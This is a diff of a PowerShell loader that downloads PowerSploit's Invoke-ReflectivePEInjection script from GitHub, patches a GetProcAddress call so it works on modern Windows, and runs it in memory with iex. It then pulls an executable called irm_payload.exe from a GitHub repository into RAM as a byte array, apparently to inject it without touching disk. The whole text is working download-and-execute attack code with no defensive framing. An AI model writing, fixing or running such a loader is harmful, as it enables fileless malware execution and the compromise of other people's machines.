@@ -1,6 +1,13 @@
-# 1. Pull down the injection engine into memory
-$FrameworkUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
-iex (Invoke-RestMethod -Uri $FrameworkUrl)
+# 1. Download the original PowerSploit code as a text string
+$RawScript = (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1").Content
+
+# 2. Patch the exact lines causing the "Ambiguous Match" crash on modern Windows
+$OldCode = "`$GetProcAddress = `$UnsafeNativeMethods.GetMethod('GetProcAddress')"
+$NewCode = "`$GetProcAddress = `$UnsafeNativeMethods.GetMethod('GetProcAddress', [type[]]@([System.Runtime.InteropServices.HandleRef], [string]))"
+$PatchedScript = $RawScript.Replace($OldCode, $NewCode)
+
+# 3. Load the patched code into memory
+iex $PatchedScript
 
 # 2. Download your compiled C++ EXE into RAM as a byte array
 $EXEBytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/Ghoat5/hello-world/raw/refs/heads/main/irm_payload.exe")
